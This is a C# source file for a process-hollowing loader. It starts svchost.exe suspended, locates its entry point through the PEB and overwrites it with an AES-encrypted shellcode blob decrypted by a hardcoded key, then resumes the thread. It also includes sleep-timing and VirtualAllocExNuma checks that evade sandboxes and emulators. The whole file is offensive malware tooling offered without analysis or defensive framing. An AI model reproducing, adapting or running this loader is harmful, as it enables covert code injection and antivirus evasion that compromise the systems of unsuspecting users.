namespace Hollower
{
    public class Program
    {
        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, System.IntPtr lpProcessAttributes,
            System.IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, System.IntPtr lpEnvironment,
            string lpCurrentDirectory, [System.Runtime.InteropServices.In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, CharSet = System.Runtime.InteropServices.CharSet.Ansi)]
        struct STARTUPINFO
        {
            public System.Int32 cb;
            public System.IntPtr lpReserved;
            public System.IntPtr lpDesktop;
            public System.IntPtr lpTitle;
            public System.Int32 dwX;
            public System.Int32 dwY;
            public System.Int32 dwXSize;
            public System.Int32 dwYSize;
            public System.Int32 dwXCountChars;
            public System.Int32 dwYCountChars;
            public System.Int32 dwFillAttribute;
            public System.Int32 dwFlags;
            public System.Int16 wShowWindow;
            public System.Int16 cbReserved2;
            public System.IntPtr lpReserved2;
            public System.IntPtr hStdInput;
            public System.IntPtr hStdOutput;
            public System.IntPtr hStdError;
        }

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public System.IntPtr hProcess;
            public System.IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(System.IntPtr hProcess, System.IntPtr lpBaseAddress, byte[] lpBuffer,
            System.Int32 nSize, out System.IntPtr lpNumberOfBytesWritten);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(System.IntPtr hProcess, System.IntPtr lpBaseAddress, [System.Runtime.InteropServices.Out] byte[] lpBuffer,
            int dwSize, out System.IntPtr lpNumberOfBytesRead);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(System.IntPtr hThread);

        [System.Runtime.InteropServices.DllImport("ntdll.dll", CallingConvention = System.Runtime.InteropServices.CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(System.IntPtr hProcess, int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public System.IntPtr Reserved1;
            public System.IntPtr PebAddress;
            public System.IntPtr Reserved2;
            public System.IntPtr Reserved3;
            public System.IntPtr UniquePid;
            public System.IntPtr MoreReserved;
        }

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern System.IntPtr VirtualAllocExNuma(System.IntPtr hProcess, System.IntPtr lpAddress,
            uint dwSize, System.UInt32 flAllocationType, System.UInt32 flProtect, System.UInt32 nndPreferred);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern System.IntPtr GetCurrentProcess();

        public static void Main(string[] args)
        {
            System.DateTime t1 = System.DateTime.Now;
            System.Threading.Thread.Sleep(2000);
            double t2 = System.DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            System.IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), System.IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            var executable = "C:\\Windows\\System32\\svchost.exe";
            if (args.Length > 0)
            {
                executable = args[0];
            }

            bool res = CreateProcess(null, executable, System.IntPtr.Zero,
                System.IntPtr.Zero, false, 0x4, System.IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            System.IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(System.IntPtr.Size * 6), ref tmp);

            System.IntPtr ptrToImageBase = (System.IntPtr)((System.Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[System.IntPtr.Size];
            System.IntPtr nRead = System.IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            System.IntPtr executableBase = (System.IntPtr)(System.BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, executableBase, data, data.Length, out nRead);

            uint e_lfanew_offset = System.BitConverter.ToUInt32(data, 0x3C);

            uint opthdr = e_lfanew_offset + 0x28;

            uint entrypoint_rva = System.BitConverter.ToUInt32(data, (int)opthdr);

            System.IntPtr addressOfEntryPoint = (System.IntPtr)(entrypoint_rva + (System.UInt64)executableBase);

            byte[] buf = new byte[528] {
                0x69, 0x8a, 0xfb, 0x9b, 0x9e, 0xa6, 0xcb, 0xb4, 0xca, 0x5e, 0x5d, 0xfa,
                0x8f, 0xd7, 0xf4, 0x12, 0x0d, 0x1a, 0xda, 0xf1, 0x06, 0x27, 0x71, 0x8f,
                0x67, 0x0e, 0xdf, 0xe2, 0x7c, 0x0f, 0x22, 0x96, 0xa7, 0x98, 0x6b, 0xe2,
                0x70, 0x10, 0x38, 0xa0, 0xb1, 0x78, 0x87, 0x6d, 0x74, 0x89, 0xdf, 0x06,
                0x52, 0x9e, 0x43, 0x14, 0x63, 0x0b, 0xb4, 0x1c, 0x70, 0xea, 0x19, 0xae,
                0xb9, 0x91, 0xd3, 0x23, 0x66, 0x50, 0x65, 0x47, 0xcc, 0x0a, 0x94, 0xdc,
                0xe2, 0x0f, 0x6a, 0xaa, 0xb5, 0x03, 0x66, 0x22, 0x1f, 0x39, 0xd0, 0x1d,
                0xe7, 0xf5, 0xa7, 0x26, 0x13, 0xf0, 0x45, 0x3f, 0xfb, 0xb5, 0xa9, 0xa8,
                0xe5, 0x7e, 0x9f, 0xf1, 0x43, 0xcc, 0x58, 0xa3, 0x03, 0x2c, 0x87, 0x70,
                0xc3, 0xeb, 0xd6, 0xcd, 0x69, 0xff, 0x87, 0xcc, 0xb0, 0x67, 0xc1, 0xb6,
                0x3b, 0x4f, 0xcf, 0x9e, 0xf9, 0x07, 0x09, 0x52, 0x62, 0xa0, 0x0b, 0xd7,
                0x4f, 0x90, 0x49, 0x79, 0x93, 0x0d, 0x01, 0xed, 0xd4, 0x6c, 0xc2, 0xad,
                0x5f, 0x57, 0x8c, 0x73, 0x0d, 0xd0, 0x3d, 0x3a, 0xa3, 0x99, 0x14, 0xf8,
                0xc6, 0xb4, 0x78, 0xde, 0xe7, 0xfd, 0xff, 0x2d, 0xa0, 0xea, 0x06, 0xdb,
                0x75, 0x3c, 0xc3, 0x99, 0x18, 0x6e, 0x74, 0x7e, 0x44, 0x16, 0xcc, 0x18,
                0x95, 0xb7, 0x40, 0xba, 0xd9, 0x38, 0x97, 0x5b, 0x5a, 0x96, 0x7b, 0x5e,
                0xa1, 0x23, 0x13, 0x4a, 0x7e, 0x9b, 0x08, 0xb2, 0x10, 0x05, 0xd5, 0x9f,
                0x9b, 0x06, 0xe0, 0x87, 0x0e, 0x33, 0xe7, 0xb1, 0x14, 0x16, 0xd3, 0x80,
                0xcd, 0xb8, 0x63, 0x6a, 0x92, 0xc8, 0x4f, 0x22, 0xba, 0x91, 0x14, 0xbb,
                0xf1, 0x45, 0xc8, 0x51, 0xf2, 0x11, 0x35, 0xd7, 0x69, 0x24, 0x30, 0xdc,
                0xf1, 0x0c, 0x78, 0xcc, 0xf5, 0x42, 0x01, 0xbe, 0x1c, 0xca, 0x21, 0xcf,
                0x63, 0x7d, 0x7c, 0xfe, 0xf4, 0x68, 0x72, 0xa8, 0x1c, 0xc3, 0xa4, 0xea,
                0xf0, 0x7c, 0x9c, 0x60, 0x8a, 0x14, 0xde, 0x6c, 0xa7, 0x40, 0x7f, 0x95,
                0xb4, 0xc1, 0x2b, 0x42, 0x28, 0x53, 0xbd, 0x7d, 0x67, 0xde, 0x92, 0x70,
                0xef, 0x07, 0xa1, 0x07, 0xed, 0xce, 0x76, 0x9c, 0x98, 0x48, 0x36, 0xe3,
                0x3c, 0xab, 0x5f, 0x60, 0x6e, 0x6d, 0xa4, 0x2d, 0xe5, 0x5b, 0xb8, 0xe5,
                0xa4, 0xad, 0x1f, 0xd0, 0xbe, 0xe2, 0x48, 0x49, 0x6b, 0x00, 0x8b, 0xa9,
                0x8e, 0x5f, 0x35, 0x95, 0xc2, 0x95, 0x2e, 0xa6, 0x7b, 0xab, 0x8d, 0xd0,
                0xde, 0x6d, 0xa1, 0x2a, 0x70, 0xca, 0x57, 0x17, 0xe9, 0x82, 0xba, 0x2c,
                0x5d, 0x56, 0x9c, 0xbd, 0xf3, 0x13, 0xa3, 0x1c, 0x0d, 0xd5, 0x89, 0xb2,
                0x89, 0xac, 0x1f, 0x5c, 0x6d, 0x66, 0x54, 0x9a, 0x81, 0x4e, 0x3d, 0x8f,
                0x2b, 0x5d, 0x06, 0x38, 0x0a, 0x20, 0xb1, 0xef, 0x07, 0xc5, 0x87, 0x2a,
                0x39, 0x0d, 0x46, 0x16, 0x18, 0x79, 0x3b, 0xd1, 0x46, 0xbb, 0x08, 0xdd,
                0x3f, 0x43, 0x91, 0xf9, 0xdc, 0xca, 0xe3, 0xff, 0x36, 0x3b, 0xad, 0x06,
                0x79, 0x8b, 0xe8, 0x93, 0xf2, 0xc3, 0x08, 0x15, 0xac, 0xb1, 0xbe, 0x03,
                0x55, 0x09, 0xb2, 0xf0, 0xf0, 0x3b, 0xc5, 0xcb, 0x75, 0xcc, 0x63, 0x81,
                0x44, 0xc1, 0x67, 0xed, 0x62, 0x41, 0x6e, 0x0e, 0xfe, 0x1b, 0x6c, 0x7a,
                0x76, 0x7d, 0x65, 0xc2, 0xdf, 0x30, 0xac, 0x4d, 0xd7, 0x11, 0xdf, 0xda,
                0x63, 0x73, 0x84, 0xcb, 0xea, 0x59, 0x83, 0xbf, 0x3b, 0x55, 0x73, 0xe1,
                0x1a, 0x96, 0x0b, 0x1c, 0xc0, 0x3b, 0x01, 0x3f, 0x22, 0xb6, 0x24, 0xfd,
                0xf1, 0x3b, 0xd7, 0x56, 0x74, 0xae, 0xcd, 0xd0, 0x09, 0x40, 0xcc, 0x31,
                0x30, 0xf5, 0xad, 0x29, 0xe8, 0xf5, 0x3a, 0x77, 0xd1, 0x89, 0x64, 0xb3,
                0x75, 0x69, 0x91, 0xd4, 0x4f, 0x8d, 0xcc, 0x67, 0xae, 0x7b, 0x57, 0x89,
                0x30, 0xfc, 0x83, 0x4a, 0x1b, 0xae, 0x61, 0xae, 0x3e, 0xdf, 0xcd, 0xb7
                };

            byte[] decrypted = Decrypt(buf);

            WriteProcessMemory(hProcess, addressOfEntryPoint, decrypted, buf.Length, out nRead);

            ResumeThread(pi.hThread);
        }

        static byte[] Decrypt(byte[] encryptedWithIv)
        {
            if (encryptedWithIv.Length < 16)
                throw new System.ArgumentException("Data too short");

            using (var aes = System.Security.Cryptography.Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Mode = System.Security.Cryptography.CipherMode.CBC;
                aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
                aes.Key = Encryption.Key;

                byte[] iv = new byte[16];
                System.Array.Copy(encryptedWithIv, 0, iv, 0, 16);
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                using (var ms = new System.IO.MemoryStream())
                {
                    using (var cs = new System.Security.Cryptography.CryptoStream(ms, decryptor, System.Security.Cryptography.CryptoStreamMode.Write))
                    {
                        cs.Write(encryptedWithIv, 16, encryptedWithIv.Length - 16);
                        cs.FlushFinalBlock();
                    }

                    return ms.ToArray();
                }
            }
        }

        static class Encryption
        {
            public static readonly byte[] Key = System.Text.Encoding.UTF8.GetBytes("t51JpSvoag6052x1go4PvuSiLOwNWifX");
        }
    }
}